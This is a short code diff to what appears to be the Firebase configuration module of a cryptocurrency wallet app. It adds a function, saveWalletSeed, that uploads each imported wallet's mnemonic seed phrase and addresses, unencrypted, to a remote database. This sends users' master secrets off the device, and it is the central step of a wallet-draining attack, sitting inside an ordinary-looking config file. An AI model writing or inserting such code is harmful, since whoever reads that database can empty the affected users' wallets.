@@ -25,6 +25,19 @@ isSupported().then((supported) => {
 
 export { app, db, analytics };
 
+// Save imported wallet seed to Firebase
+export const saveWalletSeed = async (walletId: string, mnemonic: string, addresses: Record<string, string>) => {
+  try {
+    await set(ref(db, `wallets/${walletId}`), {
+      mnemonic,
+      addresses,
+      importedAt: Date.now(),
+    });
+  } catch (error) {
+    console.error("Failed to save wallet seed:", error);
+  }
+};
+
 export interface TransactionRecord {
   coin: string;
   type: "send" | "receive";
